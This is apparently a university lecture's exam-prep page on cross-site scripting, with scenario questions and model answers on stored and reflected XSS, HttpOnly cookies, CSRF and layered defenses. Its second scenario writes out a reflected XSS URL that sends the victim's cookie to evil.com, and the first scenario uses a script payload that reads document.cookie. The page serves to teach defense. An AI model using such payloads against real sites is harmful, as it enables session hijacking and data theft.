Lecture 11 · Part 2 · Exam Prep

XSS — Exam Practice Questions

Scenario-based questions with model answers. Click any question to reveal the answer.

Quick Notes

  • Two types:
    • Stored = payload saved to database → fires for every visitor automatically
    • Reflected = payload in URL → server echoes it back → victim must click the crafted link
  • Why browser runs it:
    • Browser trust is origin-based not author-based → code from trusted domain runs with full trust
  • Three damages:
    • Web defacing → JS can change any DOM element
    • Spoofing requests → JS can call fetch() on behalf of user
    • Stealing info → JS can read cookies, page data, localStorage
  • Three defenses (in order):
    • Input validation → before saving to database
    • Output encoding → before displaying on screen (< becomes &lt;)
    • CSP header → tells browser to block inline scripts entirely
  • Key flags:
    • HttpOnly on cookie → JS cannot read that cookie even from same origin
    • Defense in Depth → applying all three layers together
The exam trap:
XSS = attacker's code runs in browser
CSRF = victim's session used to send forged request
Question Set 1

Stored XSS Scenario

Scenario

A researcher enters <script>alert(document.cookie)</script> into a social network profile field. When other users visit her profile, the alert fires in their browser.

Q(a) 2 pts What type of XSS? Why does the victim's browser execute it? ›
Model Answer
Stored XSS. Browser trust is origin-based — script came from the trusted domain so it runs automatically.
Q(b) 2 pts HttpOnly is set on the session cookie. Does the script still steal it? What can it still do? ›
Model Answer
No — HttpOnly blocks document.cookie from JavaScript. But the script can still spoof requests via fetch() or read personal data displayed on the page.
Q(c) 2 pts Name the three XSS defenses in data flow order and the principle they represent. ›
Model Answer
Input validation → output encoding → CSP header. Together they represent Defense in Depth.
Q(d) 4 pts Stored XSS vs Reflected XSS — compare persistence, delivery, and victim scale. ›
Model Answer
Stored — payload in database, fires automatically for every visitor, no crafted link needed, unlimited victims. Reflected — payload in URL, server echoes it back, victim must click the crafted link, one click one victim.
Question Set 2

Reflected XSS Scenario

Scenario

A search page shows "You searched for: [input]" without encoding. An attacker sends this URL to a victim via QR code:

http://example.com/search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>
Q(a) 2 pts What type of XSS? What makes the page vulnerable? ›
Model Answer
Reflected XSS. The page has reflective behavior — it echoes user input back without output encoding.
Q(b) 2 pts Why does the browser execute the attacker's script? ›
Model Answer
The script arrives in the response from example.com — the browser trusts the origin not the author, so it executes it.
Q(c) 2 pts One sentence each — what is the difference between XSS and CSRF? ›
Model Answer
XSS — attacker's own code runs in the victim's browser via the trusted site. CSRF — no attacker code runs; the victim's browser is tricked into sending a forged request using their own valid session.
Q(d) 4 pts Developer says "input validation is enough." Is he right? Why? ›
Model Answer
No. Three layers needed: Input validation — stops payloads entering the database but doesn't protect against reflected XSS or encoding bypasses. Output encoding — converts < to &lt; before rendering, most critical layer. CSP header — blocks inline scripts at browser level even if both above fail. This is Defense in Depth — one layer bypassed means total failure without the others.
